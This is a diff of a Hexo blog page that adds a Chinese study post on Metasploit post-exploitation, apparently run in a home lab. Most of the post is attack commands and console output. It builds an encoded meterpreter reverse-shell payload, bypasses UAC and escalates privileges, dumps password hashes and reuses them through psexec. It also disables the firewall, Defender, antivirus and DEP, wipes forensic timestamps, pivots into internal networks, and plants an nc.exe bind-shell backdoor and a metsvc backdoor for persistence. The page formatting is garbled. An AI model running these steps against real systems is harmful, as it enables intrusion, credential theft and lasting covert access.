@@ -107,7 +107,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="msf后渗透," />
 
 
 
@@ -120,15 +120,16 @@
 
 
 
-<meta name="description" content="欢迎来到Shu1L的神秘小屋！">
+<meta name="description" content="msf后渗透常见操作总结1.准备工作 已经获得目标系统控制权后扩大战果  提权 信息收集 渗透内网 永久后门   基于已有 session 扩大战果  msfvenom -a x86 –platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.0.0.128 LPORT&#x3D;4444 -b “\x00” -e x86&#x2F;shikata_ga">
 <meta property="og:type" content="article">
 <meta property="og:title" content="msf后渗透部分学习">
 <meta property="og:url" content="https://shu1l.github.io/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/index.html">
 <meta property="og:site_name" content="Shu1L&#39;s blog">
-<meta property="og:description" content="欢迎来到Shu1L的神秘小屋！">
+<meta property="og:description" content="msf后渗透常见操作总结1.准备工作 已经获得目标系统控制权后扩大战果  提权 信息收集 渗透内网 永久后门   基于已有 session 扩大战果  msfvenom -a x86 –platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.0.0.128 LPORT&#x3D;4444 -b “\x00” -e x86&#x2F;shikata_ga">
 <meta property="article:published_time" content="2020-04-28T04:36:04.000Z">
-<meta property="article:modified_time" content="2020-04-28T12:54:55.212Z">
+<meta property="article:modified_time" content="2020-05-01T08:45:47.813Z">
 <meta property="article:author" content="Shu1L">
+<meta property="article:tag" content="msf后渗透">
 <meta name="twitter:card" content="summary">
 
 
@@ -376,6 +377,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -403,7 +426,103 @@
       
 
       
-        
+        <h2 id="msf后渗透常见操作总结"><a href="#msf后渗透常见操作总结" class="headerlink" title="msf后渗透常见操作总结"></a>msf后渗透常见操作总结</h2><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h4><ul>
+<li><p>已经获得目标系统控制权后扩大战果</p>
+<ul>
+<li>提权</li>
+<li>信息收集</li>
+<li>渗透内网</li>
+<li>永久后门</li>
+</ul>
+</li>
+<li><p>基于已有 session 扩大战果</p>
+<ul>
+<li><pre><code>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.128 LPORT=4444 -b “\x00” -e x86/shikata_ga_nai -f exe -o payload.exe
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> kali 监听</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">  -</span></span><br></pre></td></tr></table></figure>
+msf &gt; use exploit/multi/handler
+msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set LHOST 10.0.0.128
+msf exploit(multi/handler) &gt; exploit -j
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>windows 系统执行 payload.exe</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>kali 进入 metepreter</span><br></pre></td></tr></table></figure>
+msf exploit(multi/handler) &gt; sessions 
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<h1 id="Active-sessions"><a href="#Active-sessions" class="headerlink" title="Active sessions"></a>Active sessions</h1><p>  Id  Name  Type                     Information             Connection</p>
+<hr>
+<p>  1         meterpreter x86/windows  WIN7-VM\John @ WIN7-VM  10.0.0.128:4444 -&gt; 10.0.0.132:62941 (10.0.0.132)</p>
+<p>msf exploit(multi/handler) &gt; sessions </p>
+<h1 id="Active-sessions-1"><a href="#Active-sessions-1" class="headerlink" title="Active sessions"></a>Active sessions</h1><p>  Id  Name  Type                     Information             Connection</p>
+<hr>
+<p>  1         meterpreter x86/windows  WIN7-VM\John @ WIN7-VM  10.0.0.128:4444 -&gt; 10.0.0.132:62941 (10.0.0.132)</p>
+<p>msf exploit(multi/handler) &gt; sessions -i 1<br>[*] Starting interaction with 1…</p>
+<p>meterpreter &gt; getuid<br>Server username: WIN7-VM\John</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">2.</span>获取<span class="keyword">system</span>账号权限</span><br><span class="line"></span><br><span class="line">- 提权失败，一般是由于 UAC 限制</span><br></pre></td></tr></table></figure>
+<p>meterpreter &gt; getuid<br>Server username: WIN7-VM\John<br>meterpreter &gt; load priv<br>[-] The ‘priv’ extension has already been loaded.<br>meterpreter &gt; getsystem<br>[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:<br>[-] Named Pipe Impersonation (In Memory/Admin)<br>[-] Named Pipe Impersonation (Dropper/Admin)<br>[-] Token Duplication (In Memory/Admin)</p>
+<p>meterpreter &gt; background</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>绕过 UAC 限制</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>use exploit/windows/local/ask</span><br></pre></td></tr></table></figure>
+<p>  use exploit/windows/local/ask<br>  set payload windows/meterpreter/reverse_tcp<br>  use exploit/windows/local/ask<br>  set payload windows/meterpreter/reverse_tcp<br>  set LHOST 10.0.0.128<br>  set FILENAME win_update.exe<br>  set SESSION 1<br>  exploit<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">ai4HMWI.png</span>)</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\MXYqrBh.png</span>)</span><br></pre></td></tr></table></figure><br>meterpreter &gt; getsystem<br>meterpreter &gt; getuid</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\uHed9pJ.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure>
+<p>use exploit/windows/local/bypassuac<br>set SESSION 1<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>show targets<br>exploit</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\eO3yUbv.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/bypassuac_injection</span><br></pre></td></tr></table></figure>
+<p>use exploit/windows/local/bypassuac_injection<br>set SESSION 1<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>exploit</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\VwGyhJD.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用漏洞直接提权为 system</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>use exploit/windows/local/ms13<span class="emphasis">_053_</span>schlamperei</span><br></pre></td></tr></table></figure>
+<p>  use exploit/windows/local/ms13_053_schlamperei<br>  set SESSION 1<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![<span class="string">img</span>](<span class="link">https://i.imgur.com/VkGx24J.png</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/ms13<span class="emphasis">_081_</span>track<span class="emphasis">_popup_</span>menu</span><br></pre></td></tr></table></figure><br>use exploit/windows/local/ms13_081_track_popup_menu<br>set SESSION 1<br>exploit</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\VkGx24J.png</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/ms13<span class="emphasis">_097_</span>ie<span class="emphasis">_registry_</span>symlink</span><br></pre></td></tr></table></figure>
+<p>use exploit/windows/local/ms13_097_ie_registry_symlink<br>set SESSION 1<br>set URIPATH /<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>set SRVHOST 10.0.0.128<br>exploit</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- <span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/ppr_flatten_rec</span><br></pre></td></tr></table></figure>
+<p>use exploit/windows/local/ppr_flatten_rec<br>set SESSION 1<br>exploit</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/Jhqu2n4.png</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>图形化 payload</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>set payload windows/vncinject/reverse_tcp</span><br></pre></td></tr></table></figure>
+<pre><code>use exploit/windows/local/ppr_flatten_rec
+set payload windows/vncinject/reverse_tcp
+set SESSION 1
+set LHOST 10.0.0.128
+set ViewOnly false
+exploit
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/wOXJo7u.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>关闭 UAC 功能</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>获取 hashdump</span><br></pre></td></tr></table></figure></code></pre><p>  meterpreter &gt; hashdump<br>      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>      John:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>  <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>尝试利用</span><br></pre></td></tr></table></figure><br>  use exploit/windows/smb/psexec<br>  set RHOST 10.0.0.132<br>  set SMBUser John<br>  set SMBPass  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>  set payload windows/meterpreter/reverse_tcp<br>  set LHOST 10.0.0.128<br>  exploit<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/vXDrNNx.png</span>)</span><br><span class="line"></span><br><span class="line">报错：Exploit failed [no-access]</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>需要提前关闭 UAC</span><br></pre></td></tr></table></figure><br>sessions -i 2<br>shell<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br>shutdown -r -t 0</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/WJBykgA.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>再次利用</span><br></pre></td></tr></table></figure>
+<p>use exploit/windows/smb/psexec<br>set RHOST 10.0.0.132<br>set SMBUser John<br>set SMBPass  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>exploit</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">4.</span>基础操作 </span><br><span class="line"></span><br><span class="line">##### 关闭 防火墙</span><br><span class="line"></span><br><span class="line">- 需要管理员或<span class="keyword">system</span>权限</span><br></pre></td></tr></table></figure>
+<p>netsh advfirewall set allprofiles state on<br>netsh advfirewall set allprofiles state off</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/VsB8p0A.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">##### 关闭windefend</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>查看服务名称</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/SITzUbY.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>关闭防火墙</span><br></pre></td></tr></table></figure>
+<p>  net stop windefend<br>  <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### bitlocker 加密</span><br><span class="line"></span><br><span class="line">- manage-bde -off C:</span><br><span class="line">- manage-bde -status C:</span><br><span class="line"></span><br><span class="line">##### 关闭DEP</span><br><span class="line"></span><br><span class="line">- bcdedit.exe /set &#123;current&#125; nx AlwaysOff</span><br><span class="line"></span><br><span class="line">##### 杀死防病毒软件</span><br><span class="line"></span><br><span class="line">- run killav</span><br><span class="line">- run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line">##### 开启远程桌面服务</span><br></pre></td></tr></table></figure></p>
+<h1 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h1><p>run post/windows/manage/enable_rdp</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/Dl02OVL.png</span>)</span><br></pre></td></tr></table></figure>
+<h1 id="关闭服务"><a href="#关闭服务" class="headerlink" title="关闭服务"></a>关闭服务</h1><p>run multi_console_command -rc root/.msf4/loot/20180418001805_default_10.0.0.132_host.windows.cle_842354.txt</p>
+<h1 id="开启服务-1"><a href="#开启服务-1" class="headerlink" title="开启服务"></a>开启服务</h1><p>run getgui –e<br>run getgui -u yuanfh -p pass<br>run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">##### 查看远程桌面</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>screenshot</span><br><span class="line"><span class="bullet">- </span>use espia</span><br><span class="line"><span class="bullet">  - </span>screengrab</span><br><span class="line"></span><br><span class="line"><span class="section">##### 使用tokens攻击域控制器</span></span><br><span class="line"></span><br><span class="line">tokens, 用户每次登录，账号绑定临时的tokens,访问资源时提交 tokens 进行身份验证，类似于 web cookies。</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>Incognito</span><br><span class="line"><span class="bullet">  - </span>独立功能的软件，被 msf 集成在 metepreter 中</span><br><span class="line"><span class="bullet">  - </span>无需密码或破解或获取密码 hash，窃取 tokens 将自己伪装成其他用户</span><br><span class="line"><span class="bullet">  - </span>尤其适用于域环境下提权渗透多操作系统</span><br><span class="line"><span class="bullet">- </span>搭建域环境</span><br><span class="line"><span class="bullet">  - </span>DC + XP</span><br><span class="line"><span class="bullet">- </span>load incognito</span><br><span class="line"><span class="bullet">  - </span><span class="code">`list_tokens -u`</span></span><br><span class="line"><span class="bullet">  - </span><span class="code">`impersonate_token lab\administrator`</span></span><br><span class="line"><span class="bullet">- </span>运行以上命令需要 getsystem</span><br><span class="line"><span class="bullet">  - </span>本地普通权限用户需要先本地权限</span><br><span class="line"><span class="bullet">  - </span><span class="code">`use exploit/windows/local/ms10_015_kitrap0d`</span></span><br><span class="line"><span class="bullet">  - </span><span class="code">`execute -f cmd.exe -i -t # -t：`</span>使用当前假冒tokens执行程序</span><br><span class="line"><span class="bullet">  - </span>shell</span><br><span class="line"></span><br><span class="line"><span class="section">##### 注册表</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>注册表保存着 windows 几乎全部配置参数</span><br><span class="line"><span class="bullet">  - </span>如果修改不当，可直接造成系统崩溃</span><br><span class="line"><span class="bullet">  - </span>修改前完整备份注册表</span><br><span class="line"><span class="bullet">  - </span>某些注册表的修改是不可逆的</span><br><span class="line"><span class="bullet">- </span>常见用途</span><br><span class="line"><span class="bullet">  - </span>修改、增加启动项</span><br><span class="line"><span class="bullet">  - </span>窃取存储于注册表中的机密信息</span><br><span class="line"><span class="bullet">  - </span>绕过文件型病毒查杀</span><br><span class="line"><span class="bullet">- </span>用注册表添加 nc 后门服务（metepreter）</span><br></pre></td></tr></table></figure>
+<p>meterpreter &gt;</p>
+<p>upload /usr/share/windows-binaries/nc.exe C:\windows\system32</p>
+<p>reg enumkey -k HKLM\software\microsoft\windows\currentversion\run</p>
+<p>reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d </p>
+<p>‘C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe’</p>
+<p>reg queryval -k HKLM\software\microsoft\windows\currentversion\Run -v nc</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>打开防火墙端口（metepreter）</span><br></pre></td></tr></table></figure>
+<p>meterpreter &gt;<br>execute -f cmd -i -H<br>netsh firewall show opmode<br>netsh firewall add portopening TCP 4444 “test” ENABLE ALL<br>shutdown -r -f -t 0<br>nc 10.0.0.132 444</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 其他注册表项</span><br><span class="line">  - https:<span class="comment">//support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart</span></span><br><span class="line"></span><br><span class="line">##### 抓包</span><br><span class="line"></span><br><span class="line">- 抓包（metepreter）</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure>
+<pre><code>load sniffer
+sniffer_interfaces
+sniffer_start 2
+sniffer_dump 2 1.cap / sniffer_dump 2 1.cap
+在内存中缓冲区块循环存储抓包（50000包），不写硬盘
+智能过滤 metepreter 流量，传输全称使用 SSL/TLS 加密
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 解码</span><br><span class="line"></span><br><span class="line">  - use auxiliary/sniffer/psnuffle</span><br><span class="line">  - set PCAPFILE /root/<span class="number">1.</span>cap</span><br><span class="line"></span><br><span class="line">##### 搜索文件</span><br><span class="line"></span><br><span class="line">- search -f *.ini</span><br><span class="line">- search -d c:\documents\ and\ settings\administrator\desktop\ -f *.docx</span><br><span class="line"></span><br><span class="line">##### 破解弱口令</span><br><span class="line"></span><br><span class="line">- John the Ripper 破解弱口令</span><br></pre></td></tr></table></figure></code></pre><ul>
+<li>use post/windows/gather/hashdump # system 权限的 metepreter</li>
+<li>run # 结果保存在 /tmp 目录下</li>
+<li>use auxiliary/analyze/jtr_crack_fast</li>
+<li>run<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">##### 擦除痕迹</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>文件系统访问会留下痕迹。电子取证重点关注</span><br><span class="line"><span class="bullet">- </span>渗透测试和攻击者往往希望销毁文件系统访问痕迹</span><br><span class="line"><span class="bullet">- </span>最好的避免被电子取证发现的方法：不要碰文件系统</span><br><span class="line"><span class="bullet">  - </span>metepreter 的先天优势所在（完全基于内存）</span><br><span class="line"><span class="bullet">- </span>MAC 时间 （Modified / Accessed / Changed）</span><br><span class="line"><span class="bullet">  - </span>ls -l –time=atime/mtime/ctime 1.txt</span><br><span class="line"><span class="bullet">  - </span>stat 1.txt</span><br><span class="line"><span class="bullet">  - </span>touch -d “2 days ago” 1.txt</span><br><span class="line"><span class="bullet">  - </span>touch -t 1501010101 1.txt</span><br><span class="line"><span class="bullet">- </span>MACE：MFT entry</span><br><span class="line"><span class="bullet">  - </span>MFT：NTFS 文件系统的主文件分配表 Master File Table</span><br><span class="line"><span class="bullet">  - </span>通常 1024 字节或2个硬盘扇区，其中存放多项 entry 信息</span><br><span class="line"><span class="bullet">  - </span>包含文件大量信息（大小 名称 目录位置 磁盘位置 创建日期）</span><br><span class="line"><span class="bullet">  - </span>更多信息可研究文件系统取证分析技术</span><br><span class="line"></span><br><span class="line"><span class="section">##### pivoting 跳板 /枢纽/支点</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>msfvenom 制作 payload</span><br></pre></td></tr></table></figure>
+msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=kali_firewall LPORT=4444 -b “\x00\xff” -e x86/shikata_ga_nai -f exe -o payload.exe<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>获取 system 权限</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/PXgwA0S.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用已经控制的一台计算机作为入侵内网的跳板</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>在其他内网计算机看来访问全部来自于跳板</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>run autoroute -s 1.1.1.0/24 # 不能访问外网的被攻击目标内网网段</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>自动路由现实场景</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure>
+  利用 win7 攻击内网 XP（对比 xp 有无外网访问权的情况）<br>  – 扫描内网：use auxiliary/scanner/portscan/tcp  <figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> Pivoting 之端口转发 portfwd</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">  -</span></span><br></pre></td></tr></table></figure>
+  利用已经被控计算机，在kali 与攻击目标之间实现端口转发<br>  portfwd add -L LIP -l LPORT -r RIP -p RPORT<br>  portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389<br>  portfwd list / delete / flush  <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- <span class="keyword">use</span> exploit/windows/smb/ms08_067_netapi</span><br></pre></td></tr></table></figure>
+set RHOST 127.0.0.1<br>set LHOST 2.1.1.10<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>set exitonsession false</span><br><span class="line"></span><br><span class="line"><span class="section">#### 持久后门</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用漏洞取得的 metepreter 运行内存中，重启失效</span><br><span class="line"><span class="bullet">- </span>重复 exploit 漏洞可能造成服务崩溃</span><br><span class="line"><span class="bullet">- </span>持久后门保证漏洞修复后仍可远程控制</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>metepreter 后门</span><br></pre></td></tr></table></figure>
+run metsvc -A # 删除 -r<br>use exploit/multi/handler<br>set PAYLOAD windows/metsvc_bind_tcp<br>set LPORT 31337<br>set RHOST 1.1.1.1<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>持久后门</span><br></pre></td></tr></table></figure>
